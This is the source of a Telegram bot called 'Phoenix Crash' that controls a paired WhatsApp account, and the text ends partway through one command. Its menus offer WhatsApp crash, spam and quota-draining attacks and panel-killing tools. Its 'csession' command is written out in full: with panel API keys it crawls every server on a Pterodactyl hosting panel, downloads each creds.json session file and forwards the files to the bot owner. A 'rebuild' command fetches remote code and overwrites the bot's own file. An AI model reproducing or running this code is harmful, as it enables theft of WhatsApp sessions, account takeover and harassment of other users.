const databaseUrl = "https://raw.githubusercontent.com/zennphoenix/database/refs/heads/main/zennjembot.json";
const thumbnailUrl = "https://a.top4top.io/p_3674pueuk1.jpg";

const axios = require('axios');
const { Telegraf } = require("telegraf");
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const { tokenBot, ownerID } = require("./settings/config");
const FormData = require("form-data");
const https = require("https");
const moment = require('moment-timezone');
const EventEmitter = require('events')
const pino = require('pino');
const { performance } = require('perf_hooks');
const crypto = require('crypto');
const chalk = require('chalk');
const { exec } = require("child_process");
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    makeMessagesSocket,
    fetchLatestWaWebVersion,
    interactiveMessage,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    generateMessageID,
    makeCacheableSignalKeyStore,
    patchMessageBeforeSending,
    generateForwardMessageContent,
    prepareWAMessageMedia,
    MessageRetryMap,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    encodeNewsletterMessage,
    getContentType,
    encodeWAMessage,
    getAggregateVotesInPollMessage,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    nativeFlowMessage,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    getButtonType,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    WAProto_1,
    baileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    extendedTextMessage,
    relayWAMessage,
    listMessage,
    templateMessage,
    encodeSignedDeviceIdentity,
    jidEncode,
    WAMessageAddressingMode,
} = require("reyzbails");
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 100) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

async function fetchValidTokens() {
  try {
    const response = await axios.get(databaseUrl);
    return response.data.tokens || [];
  } catch (error) {
    console.error(chalk.red("❌ Gagal ambil token dari GitHub:", error.message));
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa apakah token bot valid..."));
  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(tokenBot)) {
    console.log(chalk.red("⛔ TOKEN INVALID!"));
    process.exit(1);
  }
  console.log(chalk.green("✅ TOKEN TERVERIFIKASI"));
}

const bot = new Telegraf(tokenBot);
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json'

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addPremiumUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}

const startSesi = async () => {
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'Apophis',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `
<blockquote expandable>╭═─────⊱ 𝙋𝙃𝙊𝙀𝙉𝙄𝙓 𝘾𝙍𝘼𝙎𝙃 ─────═⬡
│ ⸙ Number: ${lastPairingMessage.phoneNumber}
│ ⸙ Pairing: ${lastPairingMessage.pairingCode}
│ ⸙ Status: Connected
╰═──────────────────═⬡</blockquote>
`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        }
      }
      
            console.clear();
            if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `
<blockquote expandable>╭═─────⊱ 𝙋𝙃𝙊𝙀𝙉𝙄𝙓 𝘾𝙍𝘼𝙎𝙃 ─────═⬡
│ ⸙ Number: ${lastPairingMessage.phoneNumber}
│ ⸙ Pairing: ${lastPairingMessage.pairingCode}
│ ⸙ Status: Connected
╰═──────────────────═⬡</blockquote>
`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "HTML" }  
        );  
      } catch (e) {  
      }  
    }
  });
}
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 1000

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};

const { Markup } = require("telegraf");

const mainKeyboard = Markup.keyboard([
  ["Control", "Attack"],
  ["Tools"],
  ["Support"],
  ["🌍"]
])
.resize()
.persistent();

bot.hears("🌍", (ctx) => {
  ctx.reply("https://t.me/Aboutfnl");
});

bot.start(async (ctx) => {
  const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
  const runtimeStatus = formatRuntime();
  const memoryStatus = formatMemory();
  const cooldownStatus = loadCooldown();

  const menuMessage = `
<blockquote expandable>
ハローハウ ${ctx.from.first_name}, 私はあなたを助けることができるロボットです。
できるだけ私を活用してください。

╭═──⊱ PHOENIX CRASH ─═⬡
│ Developer : @Zennzyyy
│ Version   : 2.0
│ Prefix    : / (slash) 
│ Language  : JavaScript
╰═─────────────═⬡

╭═──⊱ BOT STATUS ──═⬡
│ Sender   : ${senderStatus}
│ Runtime  : ${runtimeStatus}
│ Memory   : ${memoryStatus}
│ Cooldown : ${cooldownStatus} Second
╰═─────────────═⬡
</blockquote>
`;

  await ctx.replyWithPhoto(thumbnailUrl, {
    caption: menuMessage,
    parse_mode: "HTML",
    ...mainKeyboard
  });
});

bot.hears("Control", async (ctx) => {
  const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
  const runtimeStatus = formatRuntime();
  const memoryStatus = formatMemory();
  const cooldownStatus = loadCooldown();
  
  const controlsMenu = `
<blockquote expandable>
ハローハウ ${ctx.from.first_name}, 私はあなたを助けることができるロボットです。できるだけ私を活用してください。

╭═──⊱ 𝙋𝙃𝙊𝙀𝙉𝙄𝙓 𝘾𝙍𝘼𝙎𝙃 ─═⬡
│ ⸙ Developer: @Zennzyyy
│ ⸙ Version: 2.0
│ ⸙ Prefix: / ( slash )
│ ⸙ Language: javaScript
╰═─────────────═⬡

╭═──⊱ BOT STATUS ──═⬡
│ ⸙ Sender: ${senderStatus}
│ ⸙ Runtime: ${runtimeStatus}
│ ⸙ Memory: ${memoryStatus}
│ ⸙ Cooldown: ${cooldownStatus} Second
╰═─────────────═⬡

╭═─────⊱ CONTROLS MENU ─────═⬡
│ ⸙ /requestpair — Adding Sender Number
│ ⸙ /setcooldown — Setting Bot Cooldown
│ ⸙ /resetsession — Reset Sender Number
│ ⸙ /addpremium — Adding Premium Users
│ ⸙ /delpremium — Deleting Premium User
│ ⸙ /addgcpremium — Adding Premium Groups
│ ⸙ /delgcpremium — Deleting Premium Group
╰═──────────────────═⬡</blockquote>
`;

  await ctx.replyWithPhoto(thumbnailUrl, {
    caption: controlsMenu,
    parse_mode: "HTML",
    ...mainKeyboard
  });
});

bot.hears("Attack", async (ctx) => {
  const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
  const runtimeStatus = formatRuntime();
  const memoryStatus = formatMemory();
  const cooldownStatus = loadCooldown();

  const text = `
<blockquote expandable>
ハローハウ ${ctx.from.first_name}, 私はあなたを助けることができるロボットです。できるだけ私を活用してください。

╭═──⊱ 𝙋𝙃𝙊𝙀𝙉𝙄𝙓 𝘾𝙍𝘼𝙎𝙃 ─═⬡
│ ⸙ Developer: @Zennzyyy
│ ⸙ Version: 2.0
│ ⸙ Prefix: / ( slash )
│ ⸙ Language: javaScript
╰═─────────────═⬡

╭═──⊱ BOT STATUS ──═⬡
│ ⸙ Sender: ${senderStatus}
│ ⸙ Runtime: ${runtimeStatus}
│ ⸙ Memory: ${memoryStatus}
│ ⸙ Cooldown: ${cooldownStatus} Second
╰═─────────────═⬡

╭═─────⊱ BUGS MENU ─────═⬡
│ ⸙ /CrashMessage — Crash one
│ ⸙ /phoenixRelog — Crash Relog Whatsapp
│ ⸙ /phoenixIPhone — Invisible Crash IPhone
│ ⸙ /phoenixIPhone2 — Invisible Delay ( Spam ) 
│ ⸙ /Quota — Invisible Draining Quota
│ ⸙ /phoenixBlank — Blank Android
│ ⸙ /phoenixDozer — Dozer Delay
│ ⸙ /phoenixUi — Crash Ui Whatsapp
╰═──────────────────═⬡</blockquote>
`;

  await ctx.replyWithPhoto(thumbnailUrl, {
    caption: text,
    parse_mode: "HTML",
    ...mainKeyboard
  });
});

bot.hears("Tools", async (ctx) => {
  const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
  const runtimeStatus = formatRuntime();
  const memoryStatus = formatMemory();
  const cooldownStatus = loadCooldown();

  const text = `
<blockquote expandable>
ハローハウ ${ctx.from.first_name}, 私はあなたを助けることができるロボットです。できるだけ私を活用してください。

╭═──⊱ 𝙋𝙃𝙊𝙀𝙉𝙄𝙓 𝘾𝙍𝘼𝙎𝙃 ─═⬡
│ ⸙ Developer: @Zennzyyy
│ ⸙ Version: 2.0
│ ⸙ Prefix: / ( slash )
│ ⸙ Language: javaScript
╰═─────────────═⬡

╭═──⊱ BOT STATUS ──═⬡
│ ⸙ Sender: ${senderStatus}
│ ⸙ Runtime: ${runtimeStatus}
│ ⸙ Memory: ${memoryStatus}
│ ⸙ Cooldown: ${cooldownStatus} Second
╰═─────────────═⬡

╭═─────⊱ TOOLS MENU ─────═⬡
│ ⸙ /csession — Stealing Session Use Adp
│ ⸙ /trackip — Searching Ip Information
│ ⸙ /parsenik — Viewing Nik Information
│ ⸙ /spamngl — Spamming Ngl No Limit
│ ⸙ /tiktokdl — Download Content No Wm
│ ⸙ /iphoneqc — Create Iphone Style Words
│ ⸙ /writebook — Write Anything In A Book
│ ⸙ /fixcode — Fixing Script Errors With Ai
│ ⸙ /killpanel — Damage And Kill Panel
╰═──────────────────═⬡</blockquote>
`;

  await ctx.replyWithPhoto(thumbnailUrl, {
    caption: text,
    parse_mode: "HTML",
    ...mainKeyboard
  });
});

bot.hears("Support", async (ctx) => {
  const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
  const runtimeStatus = formatRuntime();
  const memoryStatus = formatMemory();
  const cooldownStatus = loadCooldown();

  const text = `
<blockquote expandable>
ハローハウ ${ctx.from.first_name}, 私はあなたを助けることができるロボットです。できるだけ私を活用してください。

╭═──⊱ 𝙋𝙃𝙊𝙀𝙉𝙄𝙓 𝘾𝙍𝘼𝙎𝙃 ─═⬡
│ ⸙ Developer: @Zennzyyy
│ ⸙ Version: 2.0
│ ⸙ Prefix: / ( slash )
│ ⸙ Language: javaScript
╰═─────────────═⬡

╭═──⊱ BOT STATUS ──═⬡
│ ⸙ Sender: ${senderStatus}
│ ⸙ Runtime: ${runtimeStatus}
│ ⸙ Memory: ${memoryStatus}
│ ⸙ Cooldown: ${cooldownStatus} Second
╰═─────────────═⬡

╭═─────⊱ THANKS TO ─────═⬡
│ ⸙ @Zennzyyy — The Developer
│ ⸙ @FaiqOffc — Support
╰═──────────────────═⬡</blockquote>
`;

  await ctx.replyWithPhoto(thumbnailUrl, {
    caption: text,
    parse_mode: "HTML",
    ...mainKeyboard
  });
});

bot.command("rebuild", async (ctx) => {
  const chatId = ctx.chat.id;

  const repoRaw =
    "https://raw.githubusercontent.com/zennphoenix/updatesc/refs/heads/main/phoenix.js";

  await ctx.reply("⏳ Sedang mengecek update...");

  try {
    const { data } = await axios.get(repoRaw);

    if (!data) {
      return ctx.reply("❌ Update gagal: File kosong!");
    }

    fs.writeFileSync("./phoenix.js", data);

    await ctx.reply(
      "✅ Update berhasil!\nSilakan restart bot."
    );

    // restart jika pakai PM2

  } catch (e) {
    console.error(e);
    ctx.reply(
      "❌ Update gagal. Pastikan repo dan file phoenix.js tersedia."
    );
  }
});

bot.command("requestpair", async (ctx) => {
   if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /requestpair 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber);  
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `
<blockquote expandable>╭═─────⊱ 𝙋𝙃𝙊𝙀𝙉𝙄𝙓 𝘾𝙍𝘼𝙎𝙃 ─────═⬡
│ ⸙ Number: ${phoneNumber}
│ ⸙ Pairing: ${formattedCode}
│ ⸙ Status: Not Connected
╰═──────────────────═⬡</blockquote>
`;

    const sentMsg = await ctx.replyWithPhoto(thumbnailUrl, {  
      caption: pairingMenu,  
      parse_mode: "HTML"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

bot.command("setcooldown", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcooldown 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("resetsession", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});

bot.command('addpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addpremium 12345678 30d");
    }
    const userId = args[1];
    const duration = parseInt(args[2]);
    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }
    const expiryDate = addPremiumUser(userId, duration);
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`);
});

bot.command('delpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delpremium 12345678");
    }
    const userId = args[1];
    removePremiumUser(userId);
        ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});

bot.command('addgcpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addgcpremium -12345678 30d");
    }

    const groupId = args[1];
    const duration = parseInt(args[2]);

    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }

    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');

    premiumUsers[groupId] = expiryDate;
    savePremiumUsers(premiumUsers);

    ctx.reply(`✅ ☇ ${groupId} berhasil ditambahkan sebagai grub premium sampai ${expiryDate}`);
});

bot.command('delgcpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delgcpremium -12345678");
    }

    const groupId = args[1];
    const premiumUsers = loadPremiumUsers();

    if (premiumUsers[groupId]) {
        delete premiumUsers[groupId];
        savePremiumUsers(premiumUsers);
        ctx.reply(`✅ ☇ ${groupId} telah berhasil dihapus dari daftar pengguna premium`);
    } else {
        ctx.reply(`🪧 ☇ ${groupId} tidak ada dalam daftar premium`);
    }
});

//

bot.command("csession", checkPremium, checkCooldown, async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("🪧 ☇ Format: /csession https://domainpanel.com,ptla_123,pltc_123");

  const args = text.split(",");
  const domain = args[0];
  const plta = args[1];
  const pltc = args[2];
  if (!plta || !pltc)
    return ctx.reply("🪧 ☇ Format: /csession https://panelku.com,plta_123,pltc_123");

  const base = domain.replace(/\/+$/, "");
  const commonHeadersApp = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${plta}`,
  };
  const commonHeadersClient = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${pltc}`,
  };

  function isDirectory(item) {
    if (!item || !item.attributes) return false;
    const a = item.attributes;
    if (typeof a.is_file === "boolean") return a.is_file === false;
    return (
      a.type === "dir" ||
      a.type === "directory" ||
      a.mode === "dir" ||
      a.mode === "directory" ||
      a.mode === "d" ||
      a.is_directory === true ||
      a.isDir === true
    );
  }

  async function listAllServers() {
    const out = [];
    let page = 1;
    while (true) {
      const r = await axios.get(`${base}/api/application/servers`, {
        params: { page },
        headers: commonHeadersApp,
        timeout: 15000,
      });
      const chunk = (r && r.data && Array.isArray(r.data.data)) ? r.data.data : [];
      out.push(...chunk);
      const hasNext = !!(r && r.data && r.data.meta && r.data.meta.pagination && r.data.meta.pagination.links && r.data.meta.pagination.links.next);
      if (!hasNext || chunk.length === 0) break;
      page++;
    }
    return out;
  }

  async function traverseAndFind(identifier, dir = "/") {
    try {
      const listRes = await axios.get(
        `${base}/api/client/servers/${identifier}/files/list`,
        {
          params: { directory: dir },
          headers: commonHeadersClient,
          timeout: 15000,
        }
      );
      const listJson = listRes.data;
      if (!listJson || !Array.isArray(listJson.data)) return [];
      let found = [];

      for (let item of listJson.data) {
        const name = (item.attributes && item.attributes.name) || item.name || "";
        const itemPath = (dir === "/" ? "" : dir) + "/" + name;
        const normalized = itemPath.replace(/\/+/g, "/");

        if (isDirectory(item)) {
          const more = await traverseAndFind(identifier, normalized === "" ? "/" : normalized);
          if (more.length) found = found.concat(more);
        } else {
          if (name.toLowerCase() === "creds.json") {
            found.push({ path: (dir === "/" ? "" : dir) + "/" + name, name });
          }
        }
      }
      return found;
    } catch (_) {
      return [];
    }
  }

  try {
    const servers = await listAllServers();

    if (!servers.length) {
      return ctx.reply("❌ ☇ Tidak ada server yang bisa discan");
    }

    const serverNames = servers.map((srv, i) => {
      const name =
        (srv.attributes && srv.attributes.name) ||
        srv.name ||
        (srv.attributes && srv.attributes.identifier) ||
        `server-${i + 1}`;
      return `${i + 1}. ${name}`;
    });

    const header = `🪧 ☇ Ditemukan ${servers.length} server di panel ini\n`;
    let message = header + serverNames.join("\n");
    if (message.length > 3500) {
      message =
        header +
        serverNames.slice(0, 50).join("\n") +
        `\n dan ${servers.length - 50} server lainnya`;
    }
    await ctx.reply(message);

    await ctx.reply("⏳☇ Pemindaian akan dimulai dalam 3 detik");
    await sleep(1000);
    await sleep(1000);
    await sleep(1000);
    await ctx.reply("⏳  ☇ Pemindaian creds.json dimulai");

    let totalFound = 0;

    for (let i = 0; i < servers.length; i++) {
      const srv = servers[i];
      const identifier =
        (srv.attributes && srv.attributes.identifier) ||
        srv.identifier ||
        (srv.attributes && srv.attributes.id);
      const name =
        (srv.attributes && srv.attributes.name) ||
        srv.name ||
        identifier ||
        "unknown";

      if (!identifier) continue;

      await ctx.reply(`🔎 ☇ [${i + 1}/${servers.length}] Mengecek session di server panel ${name}`);

      const list = await traverseAndFind(identifier, "/");
      if (list && list.length) {
        for (let fileInfo of list) {
          totalFound++;
          const filePath = ("/" + fileInfo.path.replace(/\/+/g, "/")).replace(/\/+$/,"");

          await ctx.reply(
            `📁 ☇ Ditemukan creds.json di server ${name}, di path ${filePath}`
          );

          try {
            const downloadRes = await axios.get(
              `${base}/api/client/servers/${identifier}/files/download`,
              {
                params: { file: filePath },
                headers: commonHeadersClient,
                timeout: 15000,
              }
            );

            const dlJson = downloadRes && downloadRes.data;
            if (dlJson && dlJson.attributes && dlJson.attributes.url) {
              const url = dlJson.attributes.url;
              const fileRes = await axios.get(url, {
                responseType: "arraybuffer",
                timeout: 20000,
              });
              const buffer = Buffer.from(fileRes.data);
              await ctx.telegram.sendDocument(ownerID, {
                source: buffer,
                filename: `${String(name).replace(/\s+/g, "_")}_creds.json`,
              });
            } else {
              await ctx.reply(
                `❌ ☇ Gagal mendapatkan url download untuk ${filePath} di server ${name}`
              );
            }
          } catch (e) {
            await ctx.reply(
              `❌ ☇ Error saat download file creds.json dari ${name}`
            );
          }
        }
      } else {
        await ctx.reply(`✅ ☇ Tidak ditemukan creds.json di server ${name}`);
      }
    }

    if (totalFound === 0) {
      return ctx.reply("✅ ☇ Scan selesai, tidak ditemukan creds.json di seluruh server");
    } else {
      return ctx.reply(`✅ ☇ Scan selesai, total file creds.json berhasil diunduh & dikirim: ${totalFound}`);
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Terjadi error saat scan");
  }
});

bot.command("trackip", checkPremium, checkCooldown, async (ctx) => {
  const args = ctx.message.text.split(" ").filter(Boolean);
  if (!args[1]) return ctx.reply("🪧 ☇ Format: /trackip 8.8.8.8");

  const ip = args[1].trim();

  function isValidIPv4(ip) {
    const parts = ip.split(".");
    if (parts.length !== 4) return false;
    return parts.every(p => {
      if (!/^\d{1,3}$/.test(p)) return false;
      if (p.length > 1 && p.startsWith("0")) return false;
      const n = Number(p);
      return n >= 0 && n <= 255;
    });
  }

  function isValidIPv6(ip) {
    const r = /^(([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|(([0-9a-fA-F]{1,4}:){1,7}:)|(:([0-9a-fA-F]{1,4}:){1,7})|(([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4})|(([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2})|(([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3})|(([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4})|(([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5})|([0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6}))|(:((:[0-9a-fA-F]{1,4}){1,7}|:)))(%.+)?$/;
    return r.test(ip);
  }

  if (!isValidIPv4(ip) && !isValidIPv6(ip)) {
    return ctx.reply("❌ ☇ Ip tidak valid");
  }

  let processingMsg = null;
  try {
    processingMsg = await ctx.reply(`🔎 ☇ Tracking ${ip} sedang diproses`, { parse_mode: "HTML" });
  } catch (e) {
    processingMsg = await ctx.reply(`🔎 ☇ Tracking ${ip} sedang diproses`);
  }

  try {
    const res = await axios.get(`https://ipwhois.app/json/${encodeURIComponent(ip)}`, { timeout: 10000 });
    const data = res.data;
    if (!data || data.success === false) {
      return await ctx.reply(`❌ ☇ Gagal mendapatkan data`);
    }

    const lat = data.latitude || "";
    const lon = data.longitude || "";
    const mapsUrl = lat && lon ? `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(lat + "," + lon)}` : null;

    const caption = `
<blockquote expandable>╭═─────⊱ 𝙋𝙃𝙊𝙀𝙉𝙄𝙓 𝘾𝙍𝘼𝙎𝙃 ─────═⬡
│ ⸙ Ip: ${data.ip || "-"}
│ ⸙ Negara: ${data.country || "-"} ${data.country_code ? `(${data.country_code})` : ""}
│ ⸙ Wilayah: ${data.region || "-"}
│ ⸙ Kota: ${data.city || "-"}
│ ⸙ Zip: ${data.postal || "-"}
│ ⸙ Waktu: ${data.timezone_gmt || "-"}
│ ⸙ Isp: ${data.isp || "-"}
│ ⸙ Org: ${data.org || "-"}
│ ⸙ Asn: ${data.asn || "-"}
│ ⸙ Lat/Lon: ${lat || "-"}, ${lon || "-"}
╰═──────────────────═⬡</blockquote>
`.trim();

